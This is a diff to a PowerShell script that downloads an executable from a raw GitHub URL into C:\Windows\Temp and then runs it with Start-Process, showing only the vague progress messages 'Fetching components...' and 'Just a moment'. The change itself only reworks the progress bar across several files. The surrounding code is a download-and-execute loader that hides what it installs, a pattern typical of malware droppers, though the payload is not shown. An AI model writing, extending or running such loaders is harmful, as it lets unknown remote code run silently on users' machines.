@@ -4,6 +4,9 @@ $downloads = @(
     @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
 )
 
+$totalFiles = $downloads.Count
+$fileIndex = 0
+
 foreach ($item in $downloads) {
     try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -25,21 +28,23 @@ foreach ($item in $downloads) {
             $totalRead += $bytesRead
 
             if ($totalBytes -gt 0) {
-                $pct = [int](($totalRead / $totalBytes) * 100)
-                Write-Progress -Activity "Fetching components..." -Status "Just a moment" -PercentComplete $pct
+                $filePct = ($totalRead / $totalBytes)
+                $totalPct = [int](($fileIndex + $filePct) / $totalFiles * 100)
+                Write-Progress -Activity "Fetching components..." -Status "Just a moment" -PercentComplete $totalPct
             }
         }
 
         $fileStream.Close()
         $stream.Close()
         $response.Close()
-
-        Write-Progress -Activity "Fetching components..." -Status "Just a moment" -Completed
+        $fileIndex++
     }
     catch {
         Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
+
+Write-Progress -Activity "Fetching components..." -Status "Just a moment" -Completed
 
 foreach ($item in $downloads) {
     Start-Process $item.Path
